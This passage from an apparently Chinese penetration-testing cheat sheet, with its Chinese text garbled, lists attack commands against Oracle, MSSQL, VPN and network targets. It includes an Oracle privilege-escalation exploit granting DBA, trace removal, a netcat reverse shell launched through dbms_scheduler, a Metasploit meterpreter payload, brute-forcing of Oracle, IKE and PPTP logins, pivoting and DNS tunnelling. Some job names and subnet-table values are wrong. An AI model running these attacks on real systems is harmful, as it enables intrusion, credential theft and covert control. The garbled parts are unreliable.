class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install oscanner</span><br></pre></td></tr></table></figure><p>ËøêË°å oscannerÔºö</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oscanner -s 192.168.1.200 -P 1521</span><br></pre></td></tr></table></figure><h4 id="Oracle-TNSÁâàÊú¨ÊåáÁ∫πËØÜÂà´"><a href="#Oracle-TNSÁâàÊú¨ÊåáÁ∫πËØÜÂà´" class="headerlink" title="Oracle TNSÁâàÊú¨ÊåáÁ∫πËØÜÂà´"></a>Oracle TNSÁâàÊú¨ÊåáÁ∫πËØÜÂà´</h4><p>ÂÆâË£Ö tnscmd10g Ôºö</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install tnscmd10g</span><br></pre></td></tr></table></figure><p>ËØÜÂà´Ôºö</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tnscmd10g version -h TARGET</span><br><span class="line">nmap --script=oracle-tns-version</span><br></pre></td></tr></table></figure><h4 id="ÁàÜÁ†¥OracleË¥¶Êà∑"><a href="#ÁàÜÁ†¥OracleË¥¶Êà∑" class="headerlink" title="ÁàÜÁ†¥OracleË¥¶Êà∑"></a>ÁàÜÁ†¥OracleË¥¶Êà∑</h4><p>È™åËØÅÈªòËÆ§Ë¥¶Êà∑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=oracle-sid-brute </span><br><span class="line">nmap --script=oracle-brute</span><br></pre></td></tr></table></figure><p>ÂØπOracle TNS ËøêË°ånmapËÑöÊú¨Ôºö</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1521 -A TARGET</span><br></pre></td></tr></table></figure><h4 id="OracleÊùÉÈôêÊèêÂçá"><a href="#OracleÊùÉÈôêÊèêÂçá" class="headerlink" title="OracleÊùÉÈôêÊèêÂçá"></a>OracleÊùÉÈôêÊèêÂçá</h4><p>Âà©Áî®Êù°‰ª∂Ôºö</p><ul><li>OracleÂøÖÈ°ªÊö¥Èú≤Âú®‰∫íËÅîÁΩë‰∏ä</li><li>‰ΩøÁî®ÈªòËÆ§Ë¥¶Êà∑ÔºåÂ¶Çscott</li></ul><p>ÁÆÄÊòéÊµÅÁ®ãÔºö</p><ul><li>ÂàõÂª∫ÂáΩÊï∞</li><li>ÂàõÂª∫Ë°® SYS.DUAL  ÁöÑÁ¥¢Âºï</li><li>ÂàöÂàöÂª∫Á´ãÁöÑÁ¥¢ÂºïÊâßË°å‰∫ÜSCOTT.DBA_X ÂáΩÊï∞</li><li>ÂáΩÊï∞ÊòØË¢´SYSÁî®Êà∑ÊâßË°åÁöÑÔºåÂõ†‰∏∫Ë°® SYS.DUAL Â±û‰∫éSYSÁî®Êà∑</li><li>ÂàõÂª∫ÂÖ∑ÊúâDBAÊùÉÈôêÁöÑË¥¶Êà∑</li></ul><p>‰∏ãÈù¢ÁöÑÂ±ïÁ§∫‰ΩøÁî®SCOTTÁî®Êà∑Ôºå‰ΩÜÂÖ∂‰ªñÈªòËÆ§ÁöÑOracleÁî®Êà∑‰πüÊòØÂèØ‰ª•ÁöÑ„ÄÇ</p><h5 id="‰ΩøÁî®NMAP-NSEËÑöÊú¨È™åËØÅoracleÊï∞ÊçÆÂ∫ì‰∏≠ÁöÑÈªòËÆ§Ë¥¶Êà∑Ôºö"><a href="#‰ΩøÁî®NMAP-NSEËÑöÊú¨È™åËØÅoracleÊï∞ÊçÆÂ∫ì‰∏≠ÁöÑÈªòËÆ§Ë¥¶Êà∑Ôºö" class="headerlink" title="‰ΩøÁî®NMAP NSEËÑöÊú¨È™åËØÅoracleÊï∞ÊçÆÂ∫ì‰∏≠ÁöÑÈªòËÆ§Ë¥¶Êà∑Ôºö"></a>‰ΩøÁî®NMAP NSEËÑöÊú¨È™åËØÅoracleÊï∞ÊçÆÂ∫ì‰∏≠ÁöÑÈªòËÆ§Ë¥¶Êà∑Ôºö</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=oracle-sid-brute </span><br><span class="line">nmap --script=oracle-brute</span><br></pre></td></tr></table></figure><p>‰ΩøÁî®ËÑÜÂº±Ë¥¶Âè∑ÁôªÈôÜÔºàÂÅáËÆæ‰Ω†ÂèëÁé∞‰∫Ü‰∏Ä‰∏™Ôºâ„ÄÇ</p><h5 id="Á°ÆËÆ§‰∏Ä‰∏™oracleÁî®Êà∑ÁöÑÊùÉÈôêÁ∫ßÂà´"><a href="#Á°ÆËÆ§‰∏Ä‰∏™oracleÁî®Êà∑ÁöÑÊùÉÈôêÁ∫ßÂà´" class="headerlink" title="Á°ÆËÆ§‰∏Ä‰∏™oracleÁî®Êà∑ÁöÑÊùÉÈôêÁ∫ßÂà´"></a>Á°ÆËÆ§‰∏Ä‰∏™oracleÁî®Êà∑ÁöÑÊùÉÈôêÁ∫ßÂà´</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select * from session_privs; </span><br><span class="line"></span><br><span class="line">SQL&gt; CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid </span><br><span class="line">curren_user is </span><br><span class="line">pragma autonomous_transaction; </span><br><span class="line">begin </span><br><span class="line">execute immediate &apos;grant dba to user1 identified by pass1&apos;;</span><br><span class="line">commit;</span><br><span class="line">return &apos;FOO&apos;;</span><br><span class="line">end;</span><br></pre></td></tr></table></figure><h5 id="OracleÊùÉÈôêÊèêÂçáÂíåËÆøÈóÆDBA"><a href="#OracleÊùÉÈôêÊèêÂçáÂíåËÆøÈóÆDBA" class="headerlink" title="OracleÊùÉÈôêÊèêÂçáÂíåËÆøÈóÆDBA"></a>OracleÊùÉÈôêÊèêÂçáÂíåËÆøÈóÆDBA</h5><p>ËøêË°ånetcatÔºå<code>netcat -nvlp 443</code> „ÄÇ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA(&apos;BAR&apos;));</span><br></pre></td></tr></table></figure><h5 id="ËøêË°åÊü•ËØ¢ËØ≠Âè•"><a href="#ËøêË°åÊü•ËØ¢ËØ≠Âè•" class="headerlink" title="ËøêË°åÊü•ËØ¢ËØ≠Âè•"></a>ËøêË°åÊü•ËØ¢ËØ≠Âè•</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; Select * from session_privs;</span><br></pre></td></tr></table></figure><p>ËøôÊó∂‰Ω†Â∫îËØ•Êã•Êúâ‰∏Ä‰∏™DBAÁî®Êà∑ÔºåÂèØ‰ª•ÈáçÊñ∞ËøêË°å‰∏äÈù¢ÁöÑÂëΩ‰ª§Êù•È™åËØÅËá™Â∑±ÊòØÂê¶Êã•ÊúâDBAÁâπÊùÉ„ÄÇ</p><h5 id="ÁßªÈô§Âà©Áî®ÁóïËøπÔºö"><a href="#ÁßªÈô§Âà©Áî®ÁóïËøπÔºö" class="headerlink" title="ÁßªÈô§Âà©Áî®ÁóïËøπÔºö"></a>ÁßªÈô§Âà©Áî®ÁóïËøπÔºö</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop index exploit_1337;</span><br></pre></td></tr></table></figure><h5 id="Ëé∑ÂèñOracleÂèçÂºπshellÔºö"><a href="#Ëé∑ÂèñOracleÂèçÂºπshellÔºö" class="headerlink" title="Ëé∑ÂèñOracleÂèçÂºπshellÔºö"></a>Ëé∑ÂèñOracleÂèçÂºπshellÔºö</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">begin</span><br><span class="line">dbms_scheduler.create_job( job_name    =&gt; &apos;MEH1337&apos;,job_type    =&gt;</span><br><span class="line">    &apos;EXECUTABLE&apos;,job_action =&gt; &apos;/bin/nc&apos;,number_of_arguments =&gt; 4,start_date =&gt;</span><br><span class="line">    SYSTIMESTAMP,enabled    =&gt; FALSE,auto_drop =&gt; TRUE); </span><br><span class="line">dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 1, &apos;TARGET-IP&apos;);</span><br><span class="line">dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 2, &apos;443&apos;);</span><br><span class="line">dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 3, &apos;-e&apos;);</span><br><span class="line">dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 4, &apos;/bin/bash&apos;);</span><br><span class="line">dbms_scheduler.enable(&apos;rev_shell&apos;); </span><br><span class="line">end;</span><br></pre></td></tr></table></figure><h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h3><p>Êûö‰∏æ/ÂèëÁé∞</p><p>Nmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156</span><br></pre></td></tr></table></figure><p>Metasploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/mssql/mssql_ping</span><br></pre></td></tr></table></figure><h4 id="ÁàÜÁ†¥-MSSQLÁôªÈôÜ"><a href="#ÁàÜÁ†¥-MSSQLÁôªÈôÜ" class="headerlink" title="ÁàÜÁ†¥ MSSQLÁôªÈôÜ"></a>ÁàÜÁ†¥ MSSQLÁôªÈôÜ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/admin/mssql/mssql_enum</span><br></pre></td></tr></table></figure><h4 id="Metasploit-MSSQL-Shell"><a href="#Metasploit-MSSQL-Shell" class="headerlink" title="Metasploit MSSQL Shell"></a>Metasploit MSSQL Shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/mssql/mssql_payload</span><br><span class="line">msf exploit(mssql_payload) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><h2 id="ÁΩëÁªú"><a href="#ÁΩëÁªú" class="headerlink" title="ÁΩëÁªú"></a>ÁΩëÁªú</h2><h3 id="Plink-exe-ÈößÈÅì"><a href="#Plink-exe-ÈößÈÅì" class="headerlink" title="Plink.exe ÈößÈÅì"></a>Plink.exe ÈößÈÅì</h3><p>PuTTY Link  ÈößÈÅì</p><p>ËΩ¨ÂèëËøêÁ®ãÁ´ØÂè£Âà∞Êú¨Âú∞Âú∞ÂùÄÔºö</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plink.exe -P 22 -l root -pw &quot;1337&quot; -R 445:127.0.0.1:445 REMOTE-IP</span><br></pre></td></tr></table></figure><h3 id="Ë∑≥ÊùøÔºàPivotingÔºâ"><a href="#Ë∑≥ÊùøÔºàPivotingÔºâ" class="headerlink" title="Ë∑≥ÊùøÔºàPivotingÔºâ"></a>Ë∑≥ÊùøÔºàPivotingÔºâ</h3><h4 id="SSH-Ë∑≥ÊùøÔºàssh-PivotingÔºâ"><a href="#SSH-Ë∑≥ÊùøÔºàssh-PivotingÔºâ" class="headerlink" title="SSH Ë∑≥ÊùøÔºàssh PivotingÔºâ"></a>SSH Ë∑≥ÊùøÔºàssh PivotingÔºâ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip</span><br></pre></td></tr></table></figure><p>ÈúÄÂú®<code>/etc/proxychains.conf</code> Ê∑ªÂä†sock4  <code>127.0.0.1 1010</code></p><p>Âà©Áî®SSHË∑≥ÊùøË∑®Ë∂äÁΩëÁªú</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1</span><br></pre></td></tr></table></figure><p>ÈúÄÂú®<code>/etc/proxychains.conf</code> Ê∑ªÂä†sock4  <code>127.0.0.1 1010</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2</span><br></pre></td></tr></table></figure><p>Âú®<code>/etc/proxychains.conf</code> Ê∑ªÂä†sock4  <code>127.0.0.1 1011</code></p><h4 id="Meterpreter-Pivoting"><a href="#Meterpreter-Pivoting" class="headerlink" title="Meterpreter Pivoting"></a>Meterpreter Pivoting</h4><h3 id="TTL-ÊåáÁ∫πËØÜÂà´"><a href="#TTL-ÊåáÁ∫πËØÜÂà´" class="headerlink" title="TTL ÊåáÁ∫πËØÜÂà´"></a>TTL ÊåáÁ∫πËØÜÂà´</h3><table><thead><tr><th>Êìç‰ΩúÁ≥ªÁªü</th><th>TTL ÂÄº</th></tr></thead><tbody><tr><td>Windows</td><td><code>128</code></td></tr><tr><td>Linux</td><td><code>64</code></td></tr><tr><td>Solaris</td><td><code>255</code></td></tr><tr><td>Cisco / Network</td><td><code>255</code></td></tr></tbody></table><h3 id="IPv4-ÈÄüÊü•"><a href="#IPv4-ÈÄüÊü•" class="headerlink" title="IPv4 ÈÄüÊü•"></a>IPv4 ÈÄüÊü•</h3><h4 id="ÂêÑÁ±ªIPÁöÑÂú∞ÂùÄËåÉÂõ¥"><a href="#ÂêÑÁ±ªIPÁöÑÂú∞ÂùÄËåÉÂõ¥" class="headerlink" title="ÂêÑÁ±ªIPÁöÑÂú∞ÂùÄËåÉÂõ¥"></a>ÂêÑÁ±ªIPÁöÑÂú∞ÂùÄËåÉÂõ¥</h4><table><thead><tr><th>Á±ªÂà´</th><th>IP Âú∞ÂùÄËåÉÂõ¥</th></tr></thead><tbody><tr><td>AÁ±ª</td><td><code>0.0.0.0 - 127.255.255.255</code></td></tr><tr><td>BÁ±ª</td><td><code>128.0.0.0 - 191.255.255.255</code></td></tr><tr><td>CÁ±ª</td><td><code>192.0.0.0 - 223.255.255.255</code></td></tr><tr><td>DÁ±ª</td><td><code>224.0.0.0 - 239.255.255.255</code></td></tr><tr><td>EÁ±ª</td><td><code>240.0.0.0 - 255.255.255.255</code></td></tr></tbody></table><h4 id="IPv4ÁßÅÊúâÂú∞ÂùÄ"><a href="#IPv4ÁßÅÊúâÂú∞ÂùÄ" class="headerlink" title="IPv4ÁßÅÊúâÂú∞ÂùÄ"></a>IPv4ÁßÅÊúâÂú∞ÂùÄ</h4><table><thead><tr><th>Á±ªÂà´</th><th>ËåÉÂõ¥</th></tr></thead><tbody><tr><td>AÁ±ªÁßÅÊúâÂú∞ÂùÄ</td><td><code>10.0.0.0 - 10.255.255.255</code></td></tr><tr><td>BÁ±ªÁßÅÊúâÂú∞ÂùÄ</td><td><code>172.16.0.0 - 172.31.255.255</code></td></tr><tr><td>CÁ±ªÁßÅÊúâÂú∞ÂùÄ</td><td><code>192.168.0.0 - 192.168.255.255</code></td></tr><tr><td></td><td><code>127.0.0.0 - 127.255.255.255</code></td></tr></tbody></table><h4 id="IPv4Â≠êÁΩëÈÄüÊü•Ë°®"><a href="#IPv4Â≠êÁΩëÈÄüÊü•Ë°®" class="headerlink" title="IPv4Â≠êÁΩëÈÄüÊü•Ë°®"></a>IPv4Â≠êÁΩëÈÄüÊü•Ë°®</h4><p>ÂíåÊ∏óÈÄèÊµãËØïÂÖ≥Á≥ª‰∏çÂ§™Â§ßÔºå‰ΩÜÁ°ÆÂÆûÂæàÊúâÁî®„ÄÇ</p><table><thead><tr><th>CIDR</th><th>ÂçÅËøõÂà∂Êé©Á†Å</th><th>‰∏ªÊú∫Êï∞Èáè</th></tr></thead><tbody><tr><td>/31</td><td><code>255.255.255.254</code></td><td><code>1 Host</code></td></tr><tr><td>/30</td><td><code>255.255.255.252</code></td><td><code>2 Hosts</code></td></tr><tr><td>/29</td><td><code>255.255.255.249</code></td><td><code>6 Hosts</code></td></tr><tr><td>/28</td><td><code>255.255.255.240</code></td><td><code>14 Hosts</code></td></tr><tr><td>/27</td><td><code>255.255.255.224</code></td><td><code>30 Hosts</code></td></tr><tr><td>/26</td><td><code>255.255.255.192</code></td><td><code>62 Hosts</code></td></tr><tr><td>/25</td><td><code>255.255.255.128</code></td><td><code>126 Hosts</code></td></tr><tr><td>/24</td><td><code>255.255.255.0</code></td><td><code>254 Hosts</code></td></tr><tr><td>/23</td><td><code>255.255.254.0</code></td><td><code>512 Host</code></td></tr><tr><td>/22</td><td><code>255.255.252.0</code></td><td><code>1022 Hosts</code></td></tr><tr><td>/21</td><td><code>255.255.248.0</code></td><td><code>2046 Hosts</code></td></tr><tr><td>/20</td><td><code>255.255.240.0</code></td><td><code>4094 Hosts</code></td></tr><tr><td>/19</td><td><code>255.255.224.0</code></td><td><code>8190 Hosts</code></td></tr><tr><td>/18</td><td><code>255.255.192.0</code></td><td><code>16382 Hosts</code></td></tr><tr><td>/17</td><td><code>255.255.128.0</code></td><td><code>32766 Hosts</code></td></tr><tr><td>/16</td><td><code>255.255.0.0</code></td><td><code>65534 Hosts</code></td></tr><tr><td>/15</td><td><code>255.254.0.0</code></td><td><code>131070 Hosts</code></td></tr><tr><td>/14</td><td><code>255.252.0.0</code></td><td><code>262142 Hosts</code></td></tr><tr><td>/13</td><td><code>255.248.0.0</code></td><td><code>524286 Hosts</code></td></tr><tr><td>/12</td><td><code>255.240.0.0</code></td><td><code>1048674 Hosts</code></td></tr><tr><td>/11</td><td><code>255.224.0.0</code></td><td><code>2097150 Hosts</code></td></tr><tr><td>/10</td><td><code>255.192.0.0</code></td><td><code>4194302 Hosts</code></td></tr><tr><td>/9</td><td><code>255.128.0.0</code></td><td><code>8388606 Hosts</code></td></tr><tr><td>/8</td><td><code>255.0.0.0</code></td><td><code>16777214 Hosts</code></td></tr></tbody></table><h3 id="VLAN-hoppingÔºàË∑≥Ë∑ÉÊîªÂáªÔºâ"><a href="#VLAN-hoppingÔºàË∑≥Ë∑ÉÊîªÂáªÔºâ" class="headerlink" title="VLAN hoppingÔºàË∑≥Ë∑ÉÊîªÂáªÔºâ"></a>VLAN hoppingÔºàË∑≥Ë∑ÉÊîªÂáªÔºâ</h3><p>‰ΩøÁî®nccgroup ÁöÑËÑöÊú¨ÁÆÄÂåñÊîªÂáªËøáÁ®ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/nccgroup/vlan-hopping.git</span><br><span class="line">chmod 700 frogger.sh</span><br><span class="line">./frogger.sh</span><br></pre></td></tr></table></figure><h3 id="VPNÊµãËØïÂ∑•ÂÖ∑"><a href="#VPNÊµãËØïÂ∑•ÂÖ∑" class="headerlink" title="VPNÊµãËØïÂ∑•ÂÖ∑"></a>VPNÊµãËØïÂ∑•ÂÖ∑</h3><p>ËØÜÂà´VPNÊúçÂä°Âô®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./udp-protocol-scanner.pl -p ike TARGET(s)</span><br></pre></td></tr></table></figure><p>Êâ´ÊèèVPNÊúçÂä°Âô®ÁΩëÊÆµÔºö</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./udp-protocol-scanner.pl -p ike -f ip.txt</span><br></pre></td></tr></table></figure><h4 id="IKEForce"><a href="#IKEForce" class="headerlink" title="IKEForce"></a>IKEForce</h4><p>‰ΩøÁî®IKEForceÊûö‰∏æÊàñÂØπ VPN ÊúçÂä°Âô®ËøõË°åÂ≠óÂÖ∏ÊîªÂáª.</p><p>ÂÆâË£Ö:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pyip</span><br><span class="line">git clone https://github.com/SpiderLabs/ikeforce.git</span><br></pre></td></tr></table></figure><p>‰ΩøÁî®IKEForceÂØπIKE VPN ËøõË°åÊûö‰∏æÔºö</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ikeforce.py TARGET-IP ‚Äìe ‚Äìw wordlists/groupnames.dic</span><br></pre></td></tr></table></figure><p>‰ΩøÁî® IKEForce ÁàÜÁ†¥ IKE VPN:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ike-scan</span><br><span class="line">ike-scan TARGET-IP</span><br><span class="line">ike-scan -A TARGET-IP</span><br><span class="line">ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key</span><br></pre></td></tr></table></figure><h4 id="IKE-ÊøÄËøõÊ®°Âºè-PSK-Á†¥Ëß£"><a href="#IKE-ÊøÄËøõÊ®°Âºè-PSK-Á†¥Ëß£" class="headerlink" title="IKE ÊøÄËøõÊ®°Âºè PSK Á†¥Ëß£"></a>IKE ÊøÄËøõÊ®°Âºè PSK Á†¥Ëß£</h4><ol><li>È™åËØÅVPNÊúçÂä°Âô®</li><li>‰ΩøÁî® IKEForce Êûö‰∏æÊù•Ëé∑ÂæóÁªÑID</li><li>‰ΩøÁî® ike-scan ‰ªéIKE ÁªàÁ´ØÊäìÂèñ PSK ÂìàÂ∏å </li><li>‰ΩøÁî® psk-crack Á†¥Ëß£ÂìàÂ∏å</li></ol><h5 id="Step-1-È™åËØÅIKEÊúçÂä°Âô®"><a href="#Step-1-È™åËØÅIKEÊúçÂä°Âô®" class="headerlink" title="Step 1: È™åËØÅIKEÊúçÂä°Âô®"></a>Step 1: È™åËØÅIKEÊúçÂä°Âô®</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./udp-protocol-scanner.pl -p ike SUBNET/24</span><br></pre></td></tr></table></figure><h5 id="Step-2-‰ΩøÁî®IKEForceÊûö‰∏æÁªÑÂêç"><a href="#Step-2-‰ΩøÁî®IKEForceÊûö‰∏æÁªÑÂêç" class="headerlink" title="Step 2:‰ΩøÁî®IKEForceÊûö‰∏æÁªÑÂêç"></a>Step 2:‰ΩøÁî®IKEForceÊûö‰∏æÁªÑÂêç</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ikeforce.py TARGET-IP ‚Äìe ‚Äìw wordlists/groupnames.dic</span><br></pre></td></tr></table></figure><h5 id="Step-3-‰ΩøÁî®ike-scanÊäìÂèñPSKÂìàÂ∏å"><a href="#Step-3-‰ΩøÁî®ike-scanÊäìÂèñPSKÂìàÂ∏å" class="headerlink" title="Step 3: ‰ΩøÁî®ike-scanÊäìÂèñPSKÂìàÂ∏å"></a>Step 3: ‰ΩøÁî®ike-scanÊäìÂèñPSKÂìàÂ∏å</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ike-scan ‚ÄìM ‚ÄìA ‚Äìn example_group -P hash-file.txt TARGET-IP</span><br></pre></td></tr></table></figure><h5 id="Step-4-‰ΩøÁî®psk-crack-Á†¥Ëß£PSK-ÂìàÂ∏å"><a href="#Step-4-‰ΩøÁî®psk-crack-Á†¥Ëß£PSK-ÂìàÂ∏å" class="headerlink" title="Step 4: ‰ΩøÁî®psk-crack Á†¥Ëß£PSK ÂìàÂ∏å"></a>Step 4: ‰ΩøÁî®psk-crack Á†¥Ëß£PSK ÂìàÂ∏å</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psk-crack hash-file.txt</span><br></pre></td></tr></table></figure><p>È´òÁ∫ßpsk-crack ÈÄâÈ°π:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pskcrack</span><br><span class="line">psk-crack -b 5 TARGET-IPkey</span><br><span class="line">psk-crack -b 5 --charset=&quot;01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot; 192-168-207-134key</span><br><span class="line">psk-crack -d /path/to/dictionary-file TARGET-IP-key</span><br></pre></td></tr></table></figure><h4 id="PPTP-Hacking"><a href="#PPTP-Hacking" class="headerlink" title="PPTP Hacking"></a>PPTP Hacking</h4><p>È™åËØÅPPTPÊúçÂä° ÔºåÂÆÉ‰ª•TCPÂçèËÆÆÂú®1723Á´ØÂè£ÁõëÂê¨</p><h5 id="NMAP-PPTP-ÊåáÁ∫πËØÜÂà´"><a href="#NMAP-PPTP-ÊåáÁ∫πËØÜÂà´" class="headerlink" title="NMAP PPTP ÊåáÁ∫πËØÜÂà´:"></a>NMAP PPTP ÊåáÁ∫πËØÜÂà´:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap ‚ÄìPn -sV -p 1723 TARGET(S)</span><br></pre></td></tr></table></figure><h5 id="PPTPÂ≠óÂÖ∏ÊîªÂáª"><a href="#PPTPÂ≠óÂÖ∏ÊîªÂáª" class="headerlink" title="PPTPÂ≠óÂÖ∏ÊîªÂáª"></a>PPTPÂ≠óÂÖ∏ÊîªÂáª</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst</span><br></pre></td></tr></table></figure><h3 id="DNS-ÈößÈÅì"><a href="#DNS-ÈößÈÅì" class="headerlink" title="DNS ÈößÈÅì"></a>DNS ÈößÈÅì</h3><p>ÈÄöËøáDNS‰º†ÈÄÅÊï∞ÊçÆÊù•ÁªïËøáÈò≤ÁÅ´Â¢ô„ÄÇdns2catÊîØÊåÅÂíåÁõÆÊ†á‰∏ªÊú∫Èó¥ ÁöÑ‰∏ä‰º†Âíå‰∏ãËΩΩÊñá‰ª∂ÔºàÊï∞ÊçÆÊàñÁ®ãÂ∫èÔºâÊìç‰Ωú„ÄÇ</p><h4 id="ÊîªÂáªÊú∫Âô®Ôºö"><a href="#ÊîªÂáªÊú∫Âô®Ôºö" class="headerlink" title="ÊîªÂáªÊú∫Âô®Ôºö"></a>ÊîªÂáªÊú∫Âô®Ôºö</h4><p>ÂÆâË£Ö:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get -y install ruby-dev git make g++</span><br><span class="line">gem install bundler</span><br><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/server</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure><p>ËøêË°ådnscat2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby ./dnscat2.rb</span><br><span class="line">dnscat2&gt; New session established: 1422</span><br><span class="line">dnscat2&gt; session -i 1422</span><br></pre></td></tr></table></figure><p>ÁõÆÊ†áÊú∫Âô®:</p><p><a href="https://downloads.skullsecurity.org/dnscat2/" target="_blank" rel="noopener">https://downloads.skullsecurity.org/dnscat2/</a> </p><p><a href="https://github.com/lukebaggett/dnscat2-powershell/" target="_blank" rel="noopener">https://github.com/lukebaggett/dnscat2-powershell/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnscat --host &lt;dnscat server_ip&gt;</span><br></pre></td></tr></table></figure><h2 id="BOF-Exploit"><a href="#BOF-Exploit" class="headerlink" title="BOF / Exploit"></a>BOF / Exploit</h2><h2 id="Exploit-ÊêúÁ¥¢"><a href="#Exploit-ÊêúÁ¥¢" class="headerlink" title="Exploit ÊêúÁ¥¢"></a>Exploit ÊêúÁ¥¢</h2><p>ÂØªÊâæÊûö‰∏æ‰∏ªÊú∫/ÊúçÂä°ÁöÑexp</p><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td>`searchsploit windows 2003</td><td>grep -i 